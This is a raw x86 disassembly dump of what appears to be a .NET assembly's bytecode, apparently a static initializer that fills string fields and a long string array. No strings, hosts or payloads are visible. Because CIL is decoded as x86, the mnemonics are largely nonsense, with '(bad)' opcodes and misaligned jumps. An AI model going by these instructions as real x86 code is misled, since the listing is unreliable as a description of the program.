  402fe1:	00 00                	add    %al,(%eax)
  402fe3:	01 1b                	add    %ebx,(%ebx)
  402fe5:	30 04 00             	xor    %al,(%eax,%eax,1)
  402fe8:	41                   	inc    %ecx
  402fe9:	00 00                	add    %al,(%eax)
  402feb:	00 12                	add    %dl,(%edx)
  402fed:	00 00                	add    %al,(%eax)
  402fef:	11 02                	adc    %eax,(%edx)
  402ff1:	72 4b                	jb     0x40303e
  402ff3:	00 00                	add    %al,(%eax)
  402ff5:	70 28                	jo     0x40301f
  402ff7:	0f 00 00             	sldt   (%eax)
  402ffa:	0a 2c 33             	or     (%ebx,%esi,1),%ch
  402ffd:	28 78 00             	sub    %bh,0x0(%eax)
  403000:	00 0a                	add    %cl,(%edx)
  403002:	1f                   	pop    %ds
  403003:	09 28                	or     %ebp,(%eax)
  403005:	06                   	push   %es
  403006:	00 00                	add    %al,(%eax)
  403008:	06                   	push   %es
  403009:	72 85                	jb     0x402f90
  40300b:	09 00                	or     %eax,(%eax)
  40300d:	70 28                	jo     0x403037
  40300f:	2c 00                	sub    $0x0,%al
  403011:	00 0a                	add    %cl,(%edx)
  403013:	0a 06                	or     (%esi),%al
  403015:	02 28                	add    (%eax),%ch
  403017:	79 00                	jns    0x403019
  403019:	00 0a                	add    %cl,(%edx)
  40301b:	28 7a 00             	sub    %bh,0x0(%edx)
  40301e:	00 0a                	add    %cl,(%edx)
  403020:	1f                   	pop    %ds
  403021:	14 16                	adc    $0x16,%al
  403023:	06                   	push   %es
  403024:	19 28                	sbb    %ebp,(%eax)
  403026:	01 00                	add    %eax,(%eax)
  403028:	00 06                	add    %al,(%esi)
  40302a:	26 de 03             	fiadds %es:(%ebx)
  40302d:	26 de 00             	fiadds %es:(%eax)
  403030:	2a 00                	sub    (%eax),%al
  403032:	00 00                	add    %al,(%eax)
  403034:	01 10                	add    %edx,(%eax)
  403036:	00 00                	add    %al,(%eax)
  403038:	00 00                	add    %al,(%eax)
  40303a:	0d 00 30 3d 00       	or     $0x3d3000,%eax
  40303f:	03 01                	add    (%ecx),%eax
  403041:	00 00                	add    %al,(%eax)
  403043:	01 13                	add    %edx,(%ebx)
  403045:	30 03                	xor    %al,(%ebx)
  403047:	00 0f                	add    %cl,(%edi)
  403049:	0b 00                	or     (%eax),%eax
  40304b:	00 17                	add    %dl,(%edi)
  40304d:	00 00                	add    %al,(%eax)
  40304f:	11 1f                	adc    %ebx,(%edi)
  403051:	20 8d 25 00 00 01    	and    %cl,0x1000025(%ebp)
  403057:	80 01 00             	addb   $0x0,(%ecx)
  40305a:	00 04 28             	add    %al,(%eax,%ebp,1)
  40305d:	7b 00                	jnp    0x40305f
  40305f:	00 0a                	add    %cl,(%edx)
  403061:	80 02 00             	addb   $0x0,(%edx)
  403064:	00 04 72             	add    %al,(%edx,%esi,2)
  403067:	8f 09 00 70          	(bad)
  40306b:	80 03 00             	addb   $0x0,(%ebx)
  40306e:	00 04 72             	add    %al,(%edx,%esi,2)
  403071:	a3 09 00 70 80       	mov    %eax,0x80700009
  403076:	04 00                	add    $0x0,%al
  403078:	00 04 17             	add    %al,(%edi,%edx,1)
  40307b:	80 05 00 00 04 72 4b 	addb   $0x4b,0x72040000
  403082:	00 00                	add    %al,(%eax)
  403084:	70 80                	jo     0x403006
  403086:	06                   	push   %es
  403087:	00 00                	add    %al,(%eax)
  403089:	04 17                	add    $0x17,%al
  40308b:	80 07 00             	addb   $0x0,(%edi)
  40308e:	00 04 72             	add    %al,(%edx,%esi,2)
  403091:	d1 09                	rorl   $1,(%ecx)
  403093:	00 70 80             	add    %dh,-0x80(%eax)
  403096:	08 00                	or     %al,(%eax)
  403098:	00 04 17             	add    %al,(%edi,%edx,1)
  40309b:	80 09 00             	orb    $0x0,(%ecx)
  40309e:	00 04 72             	add    %al,(%edx,%esi,2)
  4030a1:	eb 09                	jmp    0x4030ac
  4030a3:	00 70 80             	add    %dh,-0x80(%eax)
  4030a6:	0a 00                	or     (%eax),%al
  4030a8:	00 04 72             	add    %al,(%edx,%esi,2)
  4030ab:	03 0a                	add    (%edx),%ecx
  4030ad:	00 70 80             	add    %dh,-0x80(%eax)
  4030b0:	0b 00                	or     (%eax),%eax
  4030b2:	00 04 17             	add    %al,(%edi,%edx,1)
  4030b5:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  4030b9:	04 16                	add    $0x16,%al
  4030bb:	80 0d 00 00 04 1f 0a 	orb    $0xa,0x1f040000
  4030c2:	80 0e 00             	orb    $0x0,(%esi)
  4030c5:	00 04 72             	add    %al,(%edx,%esi,2)
  4030c8:	2b 0a                	sub    (%edx),%ecx
  4030ca:	00 70 80             	add    %dh,-0x80(%eax)
  4030cd:	0f 00 00             	sldt   (%eax)
  4030d0:	04 72                	add    $0x72,%al
  4030d2:	45                   	inc    %ebp
  4030d3:	0a 00                	or     (%eax),%al
  4030d5:	70 80                	jo     0x403057
  4030d7:	10 00                	adc    %al,(%eax)
  4030d9:	00 04 72             	add    %al,(%edx,%esi,2)
  4030dc:	6b 0a 00             	imul   $0x0,(%edx),%ecx
  4030df:	70 80                	jo     0x403061
  4030e1:	11 00                	adc    %eax,(%eax)
  4030e3:	00 04 16             	add    %al,(%esi,%edx,1)
  4030e6:	80 12 00             	adcb   $0x0,(%edx)
  4030e9:	00 04 16             	add    %al,(%esi,%edx,1)
  4030ec:	80 13 00             	adcb   $0x0,(%ebx)
  4030ef:	00 04 16             	add    %al,(%esi,%edx,1)
  4030f2:	80 14 00 00          	adcb   $0x0,(%eax,%eax,1)
  4030f6:	04 16                	add    $0x16,%al
  4030f8:	80 15 00 00 04 16 80 	adcb   $0x80,0x16040000
  4030ff:	16                   	push   %ss
  403100:	00 00                	add    %al,(%eax)
  403102:	04 72                	add    $0x72,%al
  403104:	81 0a 00 70 80 17    	orl    $0x17807000,(%edx)
  40310a:	00 00                	add    %al,(%eax)
  40310c:	04 7e                	add    $0x7e,%al
  40310e:	17                   	pop    %ss
  40310f:	00 00                	add    %al,(%eax)
  403111:	04 7e                	add    $0x7e,%al
  403113:	0b 00                	or     (%eax),%eax
  403115:	00 04 28             	add    %al,(%eax,%ebp,1)
  403118:	5d                   	pop    %ebp
  403119:	00 00                	add    %al,(%eax)
  40311b:	0a 80 18 00 00 04    	or     0x4000018(%eax),%al
  403121:	72 a1                	jb     0x4030c4
  403123:	0a 00                	or     (%eax),%al
  403125:	70 80                	jo     0x4030a7
  403127:	19 00                	sbb    %eax,(%eax)
  403129:	00 04 7e             	add    %al,(%esi,%edi,2)
  40312c:	19 00                	sbb    %eax,(%eax)
  40312e:	00 04 7e             	add    %al,(%esi,%edi,2)
  403131:	10 00                	adc    %al,(%eax)
  403133:	00 04 7e             	add    %al,(%esi,%edi,2)
  403136:	04 00                	add    $0x0,%al
  403138:	00 04 28             	add    %al,(%eax,%ebp,1)
  40313b:	2c 00                	sub    $0x0,%al
  40313d:	00 0a                	add    %cl,(%edx)
  40313f:	80 1a 00             	sbbb   $0x0,(%edx)
  403142:	00 04 72             	add    %al,(%edx,%esi,2)
  403145:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403146:	0a 00                	or     (%eax),%al
  403148:	70 73                	jo     0x4031bd
  40314a:	7c 00                	jl     0x40314c
  40314c:	00 0a                	add    %cl,(%edx)
  40314e:	80 1b 00             	sbbb   $0x0,(%ebx)
  403151:	00 04 73             	add    %al,(%ebx,%esi,2)
  403154:	7d 00                	jge    0x403156
  403156:	00 0a                	add    %cl,(%edx)
  403158:	0a 06                	or     (%esi),%al
  40315a:	72 4b                	jb     0x4031a7
  40315c:	00 00                	add    %al,(%eax)
  40315e:	70 6f                	jo     0x4031cf
  403160:	7e 00                	jle    0x403162
  403162:	00 0a                	add    %cl,(%edx)
  403164:	06                   	push   %es
  403165:	72 1b                	jb     0x403182
  403167:	0b 00                	or     (%eax),%eax
  403169:	70 6f                	jo     0x4031da
  40316b:	7e 00                	jle    0x40316d
  40316d:	00 0a                	add    %cl,(%edx)
  40316f:	06                   	push   %es
  403170:	72 67                	jb     0x4031d9
  403172:	0b 00                	or     (%eax),%eax
  403174:	70 6f                	jo     0x4031e5
  403176:	7e 00                	jle    0x403178
  403178:	00 0a                	add    %cl,(%edx)
  40317a:	06                   	push   %es
  40317b:	72 2c                	jb     0x4031a9
  40317d:	0c 00                	or     $0x0,%al
  40317f:	70 6f                	jo     0x4031f0
  403181:	7e 00                	jle    0x403183
  403183:	00 0a                	add    %cl,(%edx)
  403185:	06                   	push   %es
  403186:	72 f7                	jb     0x40317f
  403188:	0c 00                	or     $0x0,%al
  40318a:	70 6f                	jo     0x4031fb
  40318c:	7e 00                	jle    0x40318e
  40318e:	00 0a                	add    %cl,(%edx)
  403190:	06                   	push   %es
  403191:	72 b2                	jb     0x403145
  403193:	0d 00 70 6f 7e       	or     $0x7e6f7000,%eax
  403198:	00 00                	add    %al,(%eax)
  40319a:	0a 06                	or     (%esi),%al
  40319c:	72 85                	jb     0x403123
  40319e:	0e                   	push   %cs
  40319f:	00 70 6f             	add    %dh,0x6f(%eax)
  4031a2:	7e 00                	jle    0x4031a4
  4031a4:	00 0a                	add    %cl,(%edx)
  4031a6:	06                   	push   %es
  4031a7:	72 d1                	jb     0x40317a
  4031a9:	0e                   	push   %cs
  4031aa:	00 70 6f             	add    %dh,0x6f(%eax)
  4031ad:	7e 00                	jle    0x4031af
  4031af:	00 0a                	add    %cl,(%edx)
  4031b1:	06                   	push   %es
  4031b2:	72 9a                	jb     0x40314e
  4031b4:	0f 00                	(bad)
  4031b6:	70 6f                	jo     0x403227
  4031b8:	7e 00                	jle    0x4031ba
  4031ba:	00 0a                	add    %cl,(%edx)
  4031bc:	06                   	push   %es
  4031bd:	72 f0                	jb     0x4031af
  4031bf:	0f 00                	(bad)
  4031c1:	70 6f                	jo     0x403232
  4031c3:	7e 00                	jle    0x4031c5
  4031c5:	00 0a                	add    %cl,(%edx)
  4031c7:	06                   	push   %es
  4031c8:	72 83                	jb     0x40314d
  4031ca:	10 00                	adc    %al,(%eax)
  4031cc:	70 6f                	jo     0x40323d
  4031ce:	7e 00                	jle    0x4031d0
  4031d0:	00 0a                	add    %cl,(%edx)
  4031d2:	06                   	push   %es
  4031d3:	72 4b                	jb     0x403220
  4031d5:	00 00                	add    %al,(%eax)
  4031d7:	70 6f                	jo     0x403248
  4031d9:	7e 00                	jle    0x4031db
  4031db:	00 0a                	add    %cl,(%edx)
  4031dd:	06                   	push   %es
  4031de:	72 14                	jb     0x4031f4
  4031e0:	11 00                	adc    %eax,(%eax)
  4031e2:	70 6f                	jo     0x403253
  4031e4:	7e 00                	jle    0x4031e6
  4031e6:	00 0a                	add    %cl,(%edx)
  4031e8:	06                   	push   %es
  4031e9:	72 66                	jb     0x403251
  4031eb:	11 00                	adc    %eax,(%eax)
  4031ed:	70 6f                	jo     0x40325e
  4031ef:	7e 00                	jle    0x4031f1
  4031f1:	00 0a                	add    %cl,(%edx)
  4031f3:	06                   	push   %es
  4031f4:	72 4b                	jb     0x403241
  4031f6:	00 00                	add    %al,(%eax)
  4031f8:	70 6f                	jo     0x403269
  4031fa:	7e 00                	jle    0x4031fc
  4031fc:	00 0a                	add    %cl,(%edx)
  4031fe:	06                   	push   %es
  4031ff:	80 1c 00 00          	sbbb   $0x0,(%eax,%eax,1)
  403203:	04 20                	add    $0x20,%al
  403205:	e6 00                	out    %al,$0x0
  403207:	00 00                	add    %al,(%eax)
  403209:	8d 15 00 00 01 0b    	lea    0xb010000,%edx
  40320f:	07                   	pop    %es
  403210:	16                   	push   %ss
  403211:	72 a6                	jb     0x4031b9
  403213:	11 00                	adc    %eax,(%eax)
  403215:	70 a2                	jo     0x4031b9
  403217:	07                   	pop    %es
  403218:	17                   	pop    %ss
  403219:	72 b0                	jb     0x4031cb
  40321b:	11 00                	adc    %eax,(%eax)
  40321d:	70 a2                	jo     0x4031c1
  40321f:	07                   	pop    %es
  403220:	18 72 ba             	sbb    %dh,-0x46(%edx)
  403223:	11 00                	adc    %eax,(%eax)
  403225:	70 a2                	jo     0x4031c9
  403227:	07                   	pop    %es
  403228:	19 72 c4             	sbb    %esi,-0x3c(%edx)
  40322b:	11 00                	adc    %eax,(%eax)
  40322d:	70 a2                	jo     0x4031d1
  40322f:	07                   	pop    %es
  403230:	1a 72 d6             	sbb    -0x2a(%edx),%dh
  403233:	11 00                	adc    %eax,(%eax)
  403235:	70 a2                	jo     0x4031d9
  403237:	07                   	pop    %es
  403238:	1b 72 ea             	sbb    -0x16(%edx),%esi
  40323b:	11 00                	adc    %eax,(%eax)
  40323d:	70 a2                	jo     0x4031e1
  40323f:	07                   	pop    %es
  403240:	1c 72                	sbb    $0x72,%al
  403242:	f4                   	hlt
  403243:	11 00                	adc    %eax,(%eax)
  403245:	70 a2                	jo     0x4031e9
  403247:	07                   	pop    %es
  403248:	1d 72 00 12 00       	sbb    $0x120072,%eax
  40324d:	70 a2                	jo     0x4031f1
  40324f:	07                   	pop    %es
  403250:	1e                   	push   %ds
  403251:	72 0a                	jb     0x40325d
  403253:	12 00                	adc    (%eax),%al
  403255:	70 a2                	jo     0x4031f9
  403257:	07                   	pop    %es
  403258:	1f                   	pop    %ds
  403259:	09 72 16             	or     %esi,0x16(%edx)
  40325c:	12 00                	adc    (%eax),%al
  40325e:	70 a2                	jo     0x403202
  403260:	07                   	pop    %es
  403261:	1f                   	pop    %ds
  403262:	0a 72 20             	or     0x20(%edx),%dh
  403265:	12 00                	adc    (%eax),%al
  403267:	70 a2                	jo     0x40320b
  403269:	07                   	pop    %es
  40326a:	1f                   	pop    %ds
  40326b:	0b 72 2c             	or     0x2c(%edx),%esi
  40326e:	12 00                	adc    (%eax),%al
  403270:	70 a2                	jo     0x403214
  403272:	07                   	pop    %es
  403273:	1f                   	pop    %ds
  403274:	0c 72                	or     $0x72,%al
  403276:	85 09                	test   %ecx,(%ecx)
  403278:	00 70 a2             	add    %dh,-0x5e(%eax)
  40327b:	07                   	pop    %es
  40327c:	1f                   	pop    %ds
  40327d:	0d 72 36 12 00       	or     $0x123672,%eax
  403282:	70 a2                	jo     0x403226
  403284:	07                   	pop    %es
  403285:	1f                   	pop    %ds
  403286:	0e                   	push   %cs
  403287:	72 40                	jb     0x4032c9
  403289:	12 00                	adc    (%eax),%al
  40328b:	70 a2                	jo     0x40322f
  40328d:	07                   	pop    %es
  40328e:	1f                   	pop    %ds
  40328f:	0f 72                	(bad)
  403291:	4e                   	dec    %esi
  403292:	12 00                	adc    (%eax),%al
  403294:	70 a2                	jo     0x403238
  403296:	07                   	pop    %es
  403297:	1f                   	pop    %ds
  403298:	10 72 58             	adc    %dh,0x58(%edx)
  40329b:	12 00                	adc    (%eax),%al
  40329d:	70 a2                	jo     0x403241
  40329f:	07                   	pop    %es
  4032a0:	1f                   	pop    %ds
  4032a1:	11 72 62             	adc    %esi,0x62(%edx)
  4032a4:	12 00                	adc    (%eax),%al
  4032a6:	70 a2                	jo     0x40324a
  4032a8:	07                   	pop    %es
  4032a9:	1f                   	pop    %ds
  4032aa:	12 72 6c             	adc    0x6c(%edx),%dh
  4032ad:	12 00                	adc    (%eax),%al
  4032af:	70 a2                	jo     0x403253
  4032b1:	07                   	pop    %es
  4032b2:	1f                   	pop    %ds
  4032b3:	13 72 74             	adc    0x74(%edx),%esi
  4032b6:	12 00                	adc    (%eax),%al
  4032b8:	70 a2                	jo     0x40325c
  4032ba:	07                   	pop    %es
  4032bb:	1f                   	pop    %ds
  4032bc:	14 72                	adc    $0x72,%al
  4032be:	7e 12                	jle    0x4032d2
  4032c0:	00 70 a2             	add    %dh,-0x5e(%eax)
  4032c3:	07                   	pop    %es
  4032c4:	1f                   	pop    %ds
  4032c5:	15 72 88 12 00       	adc    $0x128872,%eax
  4032ca:	70 a2                	jo     0x40326e
  4032cc:	07                   	pop    %es
  4032cd:	1f                   	pop    %ds
  4032ce:	16                   	push   %ss
  4032cf:	72 92                	jb     0x403263
  4032d1:	12 00                	adc    (%eax),%al
  4032d3:	70 a2                	jo     0x403277
  4032d5:	07                   	pop    %es
  4032d6:	1f                   	pop    %ds
  4032d7:	17                   	pop    %ss
  4032d8:	72 9c                	jb     0x403276
  4032da:	12 00                	adc    (%eax),%al
  4032dc:	70 a2                	jo     0x403280
  4032de:	07                   	pop    %es
  4032df:	1f                   	pop    %ds
  4032e0:	18 72 a8             	sbb    %dh,-0x58(%edx)
  4032e3:	12 00                	adc    (%eax),%al
  4032e5:	70 a2                	jo     0x403289
  4032e7:	07                   	pop    %es
  4032e8:	1f                   	pop    %ds
  4032e9:	19 72 b4             	sbb    %esi,-0x4c(%edx)
  4032ec:	12 00                	adc    (%eax),%al
  4032ee:	70 a2                	jo     0x403292
  4032f0:	07                   	pop    %es
  4032f1:	1f                   	pop    %ds
  4032f2:	1a 72 be             	sbb    -0x42(%edx),%dh
  4032f5:	12 00                	adc    (%eax),%al
  4032f7:	70 a2                	jo     0x40329b
  4032f9:	07                   	pop    %es
  4032fa:	1f                   	pop    %ds
  4032fb:	1b 72 c8             	sbb    -0x38(%edx),%esi
  4032fe:	12 00                	adc    (%eax),%al
  403300:	70 a2                	jo     0x4032a4
  403302:	07                   	pop    %es
  403303:	1f                   	pop    %ds
  403304:	1c 72                	sbb    $0x72,%al
  403306:	d2 12                	rclb   %cl,(%edx)
  403308:	00 70 a2             	add    %dh,-0x5e(%eax)
  40330b:	07                   	pop    %es
  40330c:	1f                   	pop    %ds
  40330d:	1d 72 dc 12 00       	sbb    $0x12dc72,%eax
  403312:	70 a2                	jo     0x4032b6
  403314:	07                   	pop    %es
  403315:	1f                   	pop    %ds
  403316:	1e                   	push   %ds
  403317:	72 e6                	jb     0x4032ff
  403319:	12 00                	adc    (%eax),%al
  40331b:	70 a2                	jo     0x4032bf
  40331d:	07                   	pop    %es
  40331e:	1f                   	pop    %ds
  40331f:	1f                   	pop    %ds
  403320:	72 f0                	jb     0x403312
  403322:	12 00                	adc    (%eax),%al
  403324:	70 a2                	jo     0x4032c8
  403326:	07                   	pop    %es
  403327:	1f                   	pop    %ds
  403328:	20 72 fa             	and    %dh,-0x6(%edx)
  40332b:	12 00                	adc    (%eax),%al
  40332d:	70 a2                	jo     0x4032d1
  40332f:	07                   	pop    %es
  403330:	1f                   	pop    %ds
  403331:	21 72 06             	and    %esi,0x6(%edx)
  403334:	13 00                	adc    (%eax),%eax
  403336:	70 a2                	jo     0x4032da
  403338:	07                   	pop    %es
  403339:	1f                   	pop    %ds
  40333a:	22 72 0e             	and    0xe(%edx),%dh
  40333d:	13 00                	adc    (%eax),%eax
  40333f:	70 a2                	jo     0x4032e3
  403341:	07                   	pop    %es
  403342:	1f                   	pop    %ds
  403343:	23 72 18             	and    0x18(%edx),%esi
  403346:	13 00                	adc    (%eax),%eax
  403348:	70 a2                	jo     0x4032ec
  40334a:	07                   	pop    %es
  40334b:	1f                   	pop    %ds
  40334c:	24 72                	and    $0x72,%al
  40334e:	22 13                	and    (%ebx),%dl
  403350:	00 70 a2             	add    %dh,-0x5e(%eax)
  403353:	07                   	pop    %es
  403354:	1f                   	pop    %ds
  403355:	25 72 2c 13 00       	and    $0x132c72,%eax
  40335a:	70 a2                	jo     0x4032fe
  40335c:	07                   	pop    %es
  40335d:	1f                   	pop    %ds
  40335e:	26 72 36             	es jb  0x403397
  403361:	13 00                	adc    (%eax),%eax
  403363:	70 a2                	jo     0x403307
  403365:	07                   	pop    %es
  403366:	1f                   	pop    %ds
  403367:	27                   	daa
  403368:	72 40                	jb     0x4033aa
  40336a:	13 00                	adc    (%eax),%eax
  40336c:	70 a2                	jo     0x403310
  40336e:	07                   	pop    %es
  40336f:	1f                   	pop    %ds
  403370:	28 72 4a             	sub    %dh,0x4a(%edx)
  403373:	13 00                	adc    (%eax),%eax
  403375:	70 a2                	jo     0x403319
  403377:	07                   	pop    %es
  403378:	1f                   	pop    %ds
  403379:	29 72 54             	sub    %esi,0x54(%edx)
  40337c:	13 00                	adc    (%eax),%eax
  40337e:	70 a2                	jo     0x403322
  403380:	07                   	pop    %es
  403381:	1f                   	pop    %ds
  403382:	2a 72 5e             	sub    0x5e(%edx),%dh
  403385:	13 00                	adc    (%eax),%eax
  403387:	70 a2                	jo     0x40332b
  403389:	07                   	pop    %es
  40338a:	1f                   	pop    %ds
  40338b:	2b 72 68             	sub    0x68(%edx),%esi
  40338e:	13 00                	adc    (%eax),%eax
  403390:	70 a2                	jo     0x403334
  403392:	07                   	pop    %es
  403393:	1f                   	pop    %ds
  403394:	2c 72                	sub    $0x72,%al
  403396:	72 13                	jb     0x4033ab
  403398:	00 70 a2             	add    %dh,-0x5e(%eax)
  40339b:	07                   	pop    %es
  40339c:	1f                   	pop    %ds
  40339d:	2d 72 7c 13 00       	sub    $0x137c72,%eax
  4033a2:	70 a2                	jo     0x403346
  4033a4:	07                   	pop    %es
  4033a5:	1f                   	pop    %ds
  4033a6:	2e 72 86             	jb,pn  0x40332f
  4033a9:	13 00                	adc    (%eax),%eax
  4033ab:	70 a2                	jo     0x40334f
  4033ad:	07                   	pop    %es
  4033ae:	1f                   	pop    %ds
  4033af:	2f                   	das
  4033b0:	72 90                	jb     0x403342
  4033b2:	13 00                	adc    (%eax),%eax
  4033b4:	70 a2                	jo     0x403358
  4033b6:	07                   	pop    %es
  4033b7:	1f                   	pop    %ds
  4033b8:	30 72 9a             	xor    %dh,-0x66(%edx)
  4033bb:	13 00                	adc    (%eax),%eax
  4033bd:	70 a2                	jo     0x403361
  4033bf:	07                   	pop    %es
  4033c0:	1f                   	pop    %ds
  4033c1:	31 72 a4             	xor    %esi,-0x5c(%edx)
  4033c4:	13 00                	adc    (%eax),%eax
  4033c6:	70 a2                	jo     0x40336a
  4033c8:	07                   	pop    %es
  4033c9:	1f                   	pop    %ds
  4033ca:	32 72 b0             	xor    -0x50(%edx),%dh
  4033cd:	13 00                	adc    (%eax),%eax
  4033cf:	70 a2                	jo     0x403373
  4033d1:	07                   	pop    %es
  4033d2:	1f                   	pop    %ds
  4033d3:	33 72 ba             	xor    -0x46(%edx),%esi
  4033d6:	13 00                	adc    (%eax),%eax
  4033d8:	70 a2                	jo     0x40337c
  4033da:	07                   	pop    %es
  4033db:	1f                   	pop    %ds
  4033dc:	34 72                	xor    $0x72,%al
  4033de:	c6                   	(bad)
  4033df:	13 00                	adc    (%eax),%eax
  4033e1:	70 a2                	jo     0x403385
  4033e3:	07                   	pop    %es
  4033e4:	1f                   	pop    %ds
  4033e5:	35 72 d0 13 00       	xor    $0x13d072,%eax
  4033ea:	70 a2                	jo     0x40338e
  4033ec:	07                   	pop    %es
  4033ed:	1f                   	pop    %ds
  4033ee:	36 72 da             	ss jb  0x4033cb
  4033f1:	13 00                	adc    (%eax),%eax
  4033f3:	70 a2                	jo     0x403397
  4033f5:	07                   	pop    %es
  4033f6:	1f                   	pop    %ds
  4033f7:	37                   	aaa
  4033f8:	72 e4                	jb     0x4033de
  4033fa:	13 00                	adc    (%eax),%eax
  4033fc:	70 a2                	jo     0x4033a0
  4033fe:	07                   	pop    %es
  4033ff:	1f                   	pop    %ds
  403400:	38 72 ee             	cmp    %dh,-0x12(%edx)
  403403:	13 00                	adc    (%eax),%eax
  403405:	70 a2                	jo     0x4033a9
  403407:	07                   	pop    %es
  403408:	1f                   	pop    %ds
  403409:	39 72 fa             	cmp    %esi,-0x6(%edx)
  40340c:	13 00                	adc    (%eax),%eax
  40340e:	70 a2                	jo     0x4033b2
  403410:	07                   	pop    %es
  403411:	1f                   	pop    %ds
  403412:	3a 72 04             	cmp    0x4(%edx),%dh
  403415:	14 00                	adc    $0x0,%al
  403417:	70 a2                	jo     0x4033bb
  403419:	07                   	pop    %es
  40341a:	1f                   	pop    %ds
  40341b:	3b 72 0e             	cmp    0xe(%edx),%esi
  40341e:	14 00                	adc    $0x0,%al
  403420:	70 a2                	jo     0x4033c4
  403422:	07                   	pop    %es
  403423:	1f                   	pop    %ds
  403424:	3c 72                	cmp    $0x72,%al
  403426:	1a 14 00             	sbb    (%eax,%eax,1),%dl
  403429:	70 a2                	jo     0x4033cd
  40342b:	07                   	pop    %es
  40342c:	1f                   	pop    %ds
  40342d:	3d 72 22 14 00       	cmp    $0x142272,%eax
  403432:	70 a2                	jo     0x4033d6
  403434:	07                   	pop    %es
  403435:	1f                   	pop    %ds
  403436:	3e 72 2e             	jb,pt  0x403467
  403439:	14 00                	adc    $0x0,%al
  40343b:	70 a2                	jo     0x4033df
  40343d:	07                   	pop    %es
  40343e:	1f                   	pop    %ds
  40343f:	3f                   	aas
  403440:	72 40                	jb     0x403482
  403442:	14 00                	adc    $0x0,%al
  403444:	70 a2                	jo     0x4033e8
  403446:	07                   	pop    %es
  403447:	1f                   	pop    %ds
  403448:	40                   	inc    %eax
  403449:	72 4a                	jb     0x403495
  40344b:	14 00                	adc    $0x0,%al
  40344d:	70 a2                	jo     0x4033f1
  40344f:	07                   	pop    %es
  403450:	1f                   	pop    %ds
  403451:	41                   	inc    %ecx
  403452:	72 56                	jb     0x4034aa
  403454:	14 00                	adc    $0x0,%al
  403456:	70 a2                	jo     0x4033fa
  403458:	07                   	pop    %es
  403459:	1f                   	pop    %ds
  40345a:	42                   	inc    %edx
  40345b:	72 60                	jb     0x4034bd
  40345d:	14 00                	adc    $0x0,%al
  40345f:	70 a2                	jo     0x403403
  403461:	07                   	pop    %es
  403462:	1f                   	pop    %ds
  403463:	43                   	inc    %ebx
  403464:	72 6a                	jb     0x4034d0
  403466:	14 00                	adc    $0x0,%al
  403468:	70 a2                	jo     0x40340c
  40346a:	07                   	pop    %es
  40346b:	1f                   	pop    %ds
  40346c:	44                   	inc    %esp
  40346d:	72 74                	jb     0x4034e3
  40346f:	14 00                	adc    $0x0,%al
  403471:	70 a2                	jo     0x403415
  403473:	07                   	pop    %es
  403474:	1f                   	pop    %ds
  403475:	45                   	inc    %ebp
  403476:	72 7c                	jb     0x4034f4
  403478:	14 00                	adc    $0x0,%al
  40347a:	70 a2                	jo     0x40341e
  40347c:	07                   	pop    %es
  40347d:	1f                   	pop    %ds
  40347e:	46                   	inc    %esi
  40347f:	72 86                	jb     0x403407
  403481:	14 00                	adc    $0x0,%al
  403483:	70 a2                	jo     0x403427
  403485:	07                   	pop    %es
  403486:	1f                   	pop    %ds
  403487:	47                   	inc    %edi
  403488:	72 90                	jb     0x40341a
  40348a:	14 00                	adc    $0x0,%al
  40348c:	70 a2                	jo     0x403430
  40348e:	07                   	pop    %es
  40348f:	1f                   	pop    %ds
  403490:	48                   	dec    %eax
  403491:	72 9a                	jb     0x40342d
  403493:	14 00                	adc    $0x0,%al
  403495:	70 a2                	jo     0x403439
  403497:	07                   	pop    %es
  403498:	1f                   	pop    %ds
  403499:	49                   	dec    %ecx
  40349a:	72 a4                	jb     0x403440
  40349c:	14 00                	adc    $0x0,%al
  40349e:	70 a2                	jo     0x403442
  4034a0:	07                   	pop    %es
  4034a1:	1f                   	pop    %ds
  4034a2:	4a                   	dec    %edx
  4034a3:	72 b4                	jb     0x403459
  4034a5:	14 00                	adc    $0x0,%al
  4034a7:	70 a2                	jo     0x40344b
  4034a9:	07                   	pop    %es
  4034aa:	1f                   	pop    %ds
  4034ab:	4b                   	dec    %ebx
  4034ac:	72 c2                	jb     0x403470
  4034ae:	14 00                	adc    $0x0,%al
  4034b0:	70 a2                	jo     0x403454
  4034b2:	07                   	pop    %es
  4034b3:	1f                   	pop    %ds
  4034b4:	4c                   	dec    %esp
  4034b5:	72 cc                	jb     0x403483
  4034b7:	14 00                	adc    $0x0,%al
  4034b9:	70 a2                	jo     0x40345d
  4034bb:	07                   	pop    %es
  4034bc:	1f                   	pop    %ds
  4034bd:	4d                   	dec    %ebp
  4034be:	72 d6                	jb     0x403496
  4034c0:	14 00                	adc    $0x0,%al
  4034c2:	70 a2                	jo     0x403466
  4034c4:	07                   	pop    %es
  4034c5:	1f                   	pop    %ds
  4034c6:	4e                   	dec    %esi
  4034c7:	72 e2                	jb     0x4034ab
  4034c9:	14 00                	adc    $0x0,%al
  4034cb:	70 a2                	jo     0x40346f
  4034cd:	07                   	pop    %es
  4034ce:	1f                   	pop    %ds
  4034cf:	4f                   	dec    %edi
  4034d0:	72 ec                	jb     0x4034be
  4034d2:	14 00                	adc    $0x0,%al
  4034d4:	70 a2                	jo     0x403478
  4034d6:	07                   	pop    %es
  4034d7:	1f                   	pop    %ds
  4034d8:	50                   	push   %eax
  4034d9:	72 f6                	jb     0x4034d1
  4034db:	14 00                	adc    $0x0,%al
  4034dd:	70 a2                	jo     0x403481
  4034df:	07                   	pop    %es
  4034e0:	1f                   	pop    %ds
  4034e1:	51                   	push   %ecx
  4034e2:	72 00                	jb     0x4034e4
  4034e4:	15 00 70 a2 07       	adc    $0x7a27000,%eax
  4034e9:	1f                   	pop    %ds
  4034ea:	52                   	push   %edx
  4034eb:	72 0a                	jb     0x4034f7
  4034ed:	15 00 70 a2 07       	adc    $0x7a27000,%eax
  4034f2:	1f                   	pop    %ds
  4034f3:	53                   	push   %ebx
  4034f4:	72 14                	jb     0x40350a
  4034f6:	15 00 70 a2 07       	adc    $0x7a27000,%eax
  4034fb:	1f                   	pop    %ds
  4034fc:	54                   	push   %esp
  4034fd:	72 1e                	jb     0x40351d
  4034ff:	15 00 70 a2 07       	adc    $0x7a27000,%eax
  403504:	1f                   	pop    %ds
  403505:	55                   	push   %ebp
  403506:	72 28                	jb     0x403530
  403508:	15 00 70 a2 07       	adc    $0x7a27000,%eax
  40350d:	1f                   	pop    %ds
  40350e:	56                   	push   %esi
  40350f:	72 36                	jb     0x403547
  403511:	15 00 70 a2 07       	adc    $0x7a27000,%eax
  403516:	1f                   	pop    %ds
  403517:	57                   	push   %edi
  403518:	72 46                	jb     0x403560
